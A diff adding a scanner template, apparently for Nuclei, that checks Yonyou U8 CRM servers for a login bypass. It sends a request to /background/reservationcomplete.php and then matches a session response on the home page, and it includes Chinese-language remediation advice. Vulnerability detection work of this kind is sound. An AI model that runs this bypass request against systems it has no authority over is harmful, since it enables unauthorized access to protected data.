@@ -1,0 +1,28 @@
+id: yonyou-u8-crm-login-bypass
+
+info:
+  name: Yonyou U8 CRM 登录绕过漏洞
+  author: wy876
+  severity: high
+  tags: 用友-U8-CRM
+  description: |-
+    本模板针对 Yonyou U8 CRM - Login Bypass 组件进行检测，旨在识别可能存在的登录绕过问题。攻击者若成功利用该缺陷，可能未授权访问受保护资源，进而获取应用、系统或用户敏感信息。具体影响取决于目标环境版本、部署配置及受影响接口的暴露程度。
+  remediation: >-
+    升级受影响产品至最新的厂商支持版本，并安装所有可用的安全补丁。如果暂时无法升级，应限制对受影响端点的访问，尽可能禁用存在风险的功能，并采取身份认证、网络隔离和请求过滤等补偿性措施。同时检查相关 日志，并轮换可能已暴露的凭据或密钥。
+  
+http:
+  - raw:
+      - |
+        GET /background/reservationcomplete.php?ID=1 HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_2,"\"msg\": \"bgsesstimeout-\", \"serverName\"")'
